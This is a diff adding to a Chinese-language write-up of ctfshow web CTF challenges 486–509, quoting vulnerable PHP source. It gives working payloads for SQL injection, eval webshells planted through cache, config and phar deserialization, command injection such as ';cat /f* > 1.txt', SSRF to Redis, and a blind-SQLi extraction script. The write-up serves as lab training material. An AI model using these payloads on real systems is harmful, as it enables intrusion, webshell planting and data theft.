@@ -530,6 +530,642 @@ payload：
 
 ### web372
 
+
+
+## 中期测评
+
+### web486
+
+一进去就是一个登录页面，试了万能密码也没用，这里注意到一个action参数
+
+![image-20260420182809924](https://gitee.com/bobrocket/img/raw/master/image-20260420182809924.png)
+
+经过测试有文件读取漏洞
+
+![image-20260420183031853](https://gitee.com/bobrocket/img/raw/master/image-20260420183031853.png)
+
+直接目录穿越读取flag即可
+
+```
+?action=../flag
+```
+
+### web487
+
+```php
+<?php
+include('render/render_class.php');
+include('render/db_class.php');
+
+
+
+$action=$_GET['action'];
+if(!isset($action)){
+	header('location:index.php?action=login');
+	die();	
+}
+
+if($action=='check'){
+	$username=$_GET['username'];
+	$password=$_GET['password'];
+	$sql = "select id from user where username = md5('$username') and password=md5('$password') order by id limit 1";
+	$user=db::select_one($sql);
+	if($user){
+		templateUtil::render('index',array('username'=>$username));
+	}else{
+		header('location:index.php?action=login');
+	}
+}
+
+if($action=='login'){
+	templateUtil::render($action);
+}else{
+	templateUtil::render($action);
+}
+```
+
+这里就是sql注入了，直接用sqlmap就能跑出来
+
+### web488
+
+```php
+<?php
+include('render/render_class.php');
+include('render/db_class.php');
+
+$action=$_GET['action'];
+if(!isset($action)){
+	header('location:index.php?action=login');
+	die();	
+}
+
+if($action=='check'){
+	$username=$_GET['username'];
+	$password=$_GET['password'];
+	$sql = "select id from user where username = '".md5($username)."' and password='".md5($password)."' order by id limit 1";
+	$user=db::select_one($sql);
+	if($user){
+		templateUtil::render('index',array('username'=>$username));
+	}else{
+		templateUtil::render('error',array('username'=>$username));
+	}
+}
+
+if($action=='login'){
+	templateUtil::render($action);
+}else{
+	templateUtil::render($action);
+}
+```
+
+这次参数没法拼接进sql语句中了，我们看看还有什么漏洞
+
+```php
+<?php
+//render/render_class
+ini_set('display_errors', 'On');
+include('file_class.php');
+include('cache_class.php');
+
+class templateUtil {
+	public static function render($template,$arg=array()){
+		if(cache::cache_exists($template)){
+			echo cache::get_cache($template);
+		}else{
+			$templateContent=fileUtil::read('templates/'.$template.'.php');//最初是{{username}}不存在
+			$cache=templateUtil::shade($templateContent,$arg);
+			cache::create_cache($template,$cache);//$template="error"
+			echo $cache;
+		}
+	}
+	public static  function shade($templateContent,$arg){
+		foreach ($arg as $key => $value) {//循环遍历数组中的每一个键值对，取出当前的键和值
+			$templateContent=str_replace('{{'.$key.'}}', $value, $templateContent);
+		}
+		return $templateContent;
+	}
+
+}
+```
+
+```php
+<?php
+//file_class.php
+ini_set('display_errors', 'On');
+class fileUtil{
+
+	public static function read($filename){
+		return file_get_contents($filename);
+	}
+
+	public static function write($filename,$content,$append =0){
+		if($append){
+			file_put_contents($filename, $content,FILE_APPEND);
+		}else{
+			file_put_contents($filename, $content);
+		}
+	}
+}
+```
+
+```php
+<?php
+//cache_class.php
+ini_set('display_errors', 'On');
+
+class cache{
+	public static function create_cache($template,$content){
+		if(file_exists('cache/'.md5($template).'.php')){//检查是否有缓存文件，也就是说必须是打开靶机后第一次报错
+			return true;
+		}else{
+			fileUtil::write('cache/'.md5($template).'.php',$content);
+		}
+	}
+	public static function get_cache($template){
+		return fileUtil::read('cache/'.md5($template).'.php');
+	}
+	public static function cache_exists($template){
+		return file_exists('cache/'.md5($template).'.php');
+	}
+
+}
+```
+
+可以写入文件实现rce，payload：
+
+```
+?action=check&username=<?=@eval($_POST[1])?>&password=1
+```
+
+然后访问
+
+```
+/cache/cb5e100e5a9a3e7f6d1fd97512215282.php
+```
+
+### web489
+
+```php
+<?php
+include('render/render_class.php');
+include('render/db_class.php');
+
+$action=$_GET['action'];
+if(!isset($action)){
+	header('location:index.php?action=login');
+	die();	
+}
+
+if($action=='check'){
+	$sql = "select id from user where username = '".md5($username)."' and password='".md5($password)."' order by id limit 1";
+	extract($_GET);//可以通过 URL 参数来创建或覆盖脚本中的任何变量
+	$user=db::select_one($sql);
+	if($user){
+		templateUtil::render('index',array('username'=>$username));
+	}else{
+		templateUtil::render('error');
+	}
+}
+
+if($action=='clear'){
+	system('rm -rf cache/*');
+	die('cache clear');
+}
+
+if($action=='login'){
+	templateUtil::render($action);
+}else{
+	templateUtil::render($action);
+}
+```
+
+其他部分和上题一样，这里有变量覆盖漏洞，先清空缓存再写马即可
+
+```
+?action=check&sql=select 1&username=<?=@eval($_POST[1]);?>&password=1
+```
+
+### web490
+
+```
+?action=check&username=' union select '@eval($_POST[1]);'--  #&password=1
+```
+
+### web491
+
+依旧盲注，依旧sqlmap
+
+![image-20260420192108895](https://gitee.com/bobrocket/img/raw/master/image-20260420192108895.png)
+
+### web492
+
+```php
+if($action=='check'){
+	extract($_GET);
+	if(preg_match('/^[A-Za-z0-9]+$/', $username)){
+		$sql = "select username from user where username = '".$username."' and password='".md5($password)."' order by id limit 1";
+		$user=db::select_one_array($sql);
+	}
+	if($user){
+		templateUtil::render('index',$user);
+	}else{
+		templateUtil::render('error');
+	}
+}
+```
+
+>关于select_one_array
+>
+>- 执行一个 SQL 查询。
+>- 返回查询结果的第一条记录。
+>- 将这条记录作为数组返回，其中每个数组元素代表一个数据库字段。
+
+做的时候还是思路太局限了，总是在想怎么利用sql语句，殊不知我们直接走变量覆盖就行了
+
+```
+?action=check&user[username]=<?php eval($_POST[1]);?>
+```
+
+### web493
+
+```php
+if(!isset($action)){
+	if(isset($_COOKIE['user'])){
+		$c=$_COOKIE['user'];
+		$user=unserialize($c);
+		if($user){
+			templateUtil::render('index');
+		}else{
+			header('location:index.php?action=login');
+		}
+	}else{
+		header('location:index.php?action=login');
+	}
+	die();	
+}
+```
+
+这里有一个反序列化的入口，下面去找恶意类
+
+```php
+//render/db_class.php
+class dbLog{
+	public $sql;
+	public $content;
+	public $log;
+
+	public function __construct(){
+		$this->log='log/'.date_format(date_create(),"Y-m-d").'.txt';
+	}
+	public function log($sql){
+		$this->content = $this->content.date_format(date_create(),"Y-m-d-H-i-s").' '.$sql.' \r\n';
+	}
+	public function __destruct(){
+		file_put_contents($this->log, $this->content,FILE_APPEND);
+	}
+}
+```
+
+之前学习反序列化的时候混淆了，反序列化重建对象的时候是不会触发`__construct`方法的
+
+```php
+<?php
+class dbLog{
+    public $sql;
+    public $content='<?php @eval($_POST[1]);?>';
+    public $log="shell.php";
+}
+
+$db = new dbLog();
+echo urlencode(serialize($db));
+```
+
+### web494
+
+和上题一样，下马之后用蚁剑连接，根据`db_class.php`的内容连接数据库（第一次用这个功能）
+
+![image-20260422165707884](https://gitee.com/bobrocket/img/raw/master/image-20260422165707884.png)
+
+### web496
+
+```python
+import requests
+import string
+url="http://91fbba7b-a1af-4857-a5b8-a03ca9d4eaaf.challenge.ctf.show/"
+s=string.ascii_lowercase+string.digits+",{-}"
+sess=requests.session()
+sess.post(url+"?action=check",data={"username":"'||1#","password":1})
+flag=""
+for i in range(9,70):
+    for j in s:
+        data={
+        'nickname':str(i*2)+str(j), #不让nickname重复就行
+        #'user[username]':"'||if(ascii(substr((select  group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1},1,0)#".format(i,j)
+        #'user[username]':"'||if(substr((select  group_concat(column_name) from information_schema.columns where table_name='flagyoudontknow76'),{0},1)='{1}',1,0)#".format(i,j)
+            'user[username]':"'||if(substr((select  flagisherebutyouneverknow118 from flagyoudontknow76),{0},1)='{1}',1,0)#".format(i,j)
+        }
+        r=sess.post(url+"/api/admin_edit.php",data=data)
+        if("u529f" in r.text):
+            flag+=j
+            print(flag)
+            break
+```
+
+### web497
+
+还是用万能密码登录进后台，有个地方能修改头像，用file协议读文件
+
+![image-20260422202006958](https://gitee.com/bobrocket/img/raw/master/image-20260422202006958.png)
+
+### web498
+
+SSRF漏洞还在，只是flag的文件名改了，不能直接读
+
+用dict协议扫一下端口，发现6379端口可用，这是Redis的端口，尝试一下用gopherus打无密码redis
+
+![image-20260422204600405](https://gitee.com/bobrocket/img/raw/master/image-20260422204600405.png)
+
+### web499
+
+还是万能密码登后台，这次多了一个系统配置
+
+![image-20260426161424276](https://gitee.com/bobrocket/img/raw/master/image-20260426161424276.png)
+
+我们发现它调用了一个api，admin_settings.php，而这个接口会把序列化后的网站信息写入../config/settings.php
+
+我们尝试直接写一句话木马
+
+![image-20260426161717885](https://gitee.com/bobrocket/img/raw/master/image-20260426161717885.png)
+
+### web500
+
+万能密码进后台，上题的序列化文件不再是php了，然后这次有一个数据库备份
+
+```php
+if($user){
+	extract($_POST);
+	shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.__DIR__.'/../backup/'.$db_path);
+
+
+	if(file_exists(__DIR__.'/../backup/'.$db_path)){
+		$ret['msg']='数据库备份成功';
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+```
+
+很明显的命令拼接漏洞，切记切记区分exec和eval，这里直接拼接linux命令进去就行了
+
+```
+db_path=;cat /f* > 1.txt
+```
+
+### web501
+
+```php
+if($user){
+	extract($_POST);
+
+	if(preg_match('/^zip|tar|sql$/', $db_format)){
+		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format);
+		if(file_exists(__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format)){
+			$ret['msg']='数据库备份成功';
+		}else{
+			$ret['msg']='数据库备份失败';
+		}
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+```
+
+在上个题的基础上增加了正则过滤
+
+```
+db_format=zip;cat /f* > 1.txt
+```
+
+### web502
+
+```php
+if($user){
+	extract($_POST);
+	if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+			die(json_encode($ret));
+	}
+
+	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
+		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.$pre.$db_format);
+		if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+		}else{
+			$ret['msg']='数据库备份失败';
+		}
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+```
+
+什么叫顾头不顾腚
+
+```
+pre=2.txt;ls / > 1.txt;&db_format=zip
+```
+
+### web503
+
+#### 补充：触发phar反序列化的函数
+
+![image-20260426203147557](https://gitee.com/bobrocket/img/raw/master/image-20260426203147557.png)
+
+我们还是去看备份数据库
+
+```php
+include('../render/db_class.php');
+error_reporting(0);
+$user= $_SESSION['user'];
+$pre=__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'/db.';
+$ret = array(
+		"code"=>0,
+		"msg"=>"查询失败",
+		"count"=>0,
+		"data"=>array()
+	);
+if($user){
+	extract($_POST);
+	if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+			die(json_encode($ret));
+	}
+
+	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
+		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.md5($pre.$db_format));
+		if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+		}else{
+			$ret['msg']='数据库备份失败';
+		}
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+
+```
+
+这里md5写死了，命令拼接肯定是不行了，不过可以找到一个logo上传
+
+```php
+if($user){
+	$arr = $_FILES["file"];
+	if(($arr["type"]=="image/jpeg" || $arr["type"]=="image/png" ) && $arr["size"]<10241000 )
+	{
+		$arr["tmp_name"];
+		$filename = md5($arr['name']);
+		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
+		if(!preg_match('/^php$/i', $ext)){
+			$basename = "../img/".$filename.'.' . $ext;
+			move_uploaded_file($arr["tmp_name"],$basename);
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$config['logo']=$filename.'.' . $ext;
+			file_put_contents(__DIR__.'/../config/settings', serialize($config));
+			$ret['msg']='文件上传成功';
+		}
+		
+	}else{
+		$ret['msg']='文件上传失败';
+	}
+	
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+```
+
+结合之前的恶意类，这不就来了，上传一个恶意的png，然后用`file_exits`来触发phar反序列化
+
+```php
+<?php
+
+class dbLog{
+    public $sql;
+    public $content = '<?php eval($_POST[1]);?>';
+    public $log = '1.php';
+}
+
+$a = new dbLog();
+$phar = new Phar('a.phar');
+$phar -> startBuffering();
+$phar -> addFromString('test.txt','test');
+$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER(); ?>');
+$phar -> setMetadata($a);//这个方法允许你将任何可序列化的 PHP 变量（如数组、对象、字符串等）作为元数据存储起来。
+$phar -> stopBuffering();
+```
+
+直接把文件名改成png
+
+```
+db_format=img/ee6d68225691981a53cadf2f11b187a7.jpg&pre=phar:///var/www/html/
+```
+
+不过为什么一句话木马被写在`/var/www/html`
+
+初步推测应该是这个api接口会在index.php调用导致的
+
+### web504
+
+这次多了一个模板列表和新增模板，不过读不到源码
+
+![image-20260427144253908](https://gitee.com/bobrocket/img/raw/master/image-20260427144253908.png)
+
+.sml在这里应该就是一种简单标记文件，没什么利用价值，我们看看能不能上传php
+
+![image-20260427144523567](https://gitee.com/bobrocket/img/raw/master/image-20260427144523567.png)
+
+这里想到前面有一个./config/settings，我们可以利用这个触发反序列化
+
+```php
+<?php
+
+class dbLog{
+    public $sql;
+    public $content ='<?php @eval($_POST[1]);?>';
+    public $log ="1.php";
+
+    public function __destruct(){
+        file_put_contents($this->log, $this->content,FILE_APPEND);
+    }
+}
+
+$final = new dbLog();
+echo serialize($final);
+```
+
+###  web505-507
+
+方法多多，可以结合之前的文件上传也可以用伪协议
+
+```
+debug=1&f=data://text/plain,user<?php system('cat /f*');?>
+```
+
+### web508
+
+![image-20260427160555319](https://gitee.com/bobrocket/img/raw/master/image-20260427160555319.png)
+
+这次把伪协议禁了，我们需要找一个地方上传
+
+#### 方法一
+
+![image-20260427161232575](https://gitee.com/bobrocket/img/raw/master/image-20260427161232575.png)
+
+上传logo的地方没有过滤，我们把一句话木马后缀改成png直接上传就行
+
+#### 方法二
+
+![image-20260427162916155](https://gitee.com/bobrocket/img/raw/master/image-20260427162916155.png)
+
+
+
+之前修改头像的地方，把图片放到了session里面
+
+### web509
+
+上题上传logo的地方做了过滤，我们用短标签+反引号绕过
+
+```
+user<?= `cat /f*`?>
+```
+
+
+
+
+
 ## 常用姿势
 
 ### web801（flask算PIN）
@@ -729,8 +1365,8 @@ web目录下没有写入权限，我们把文件写到/tmp
 <?php
 $phar=new Phar("shell.phar");
 $phar->startBuffering();
-$phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
-$phar->addFromString("a.txt","<?php eval(\$_POST[1]);?>");
+$phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');//she
+$phar->addFromString("a.txt","<?php eval(\$_POST[1]);?>");//向phar归档添加一个名为a.txt的文件
 $phar->stopBuffering();
 ?>
 ```
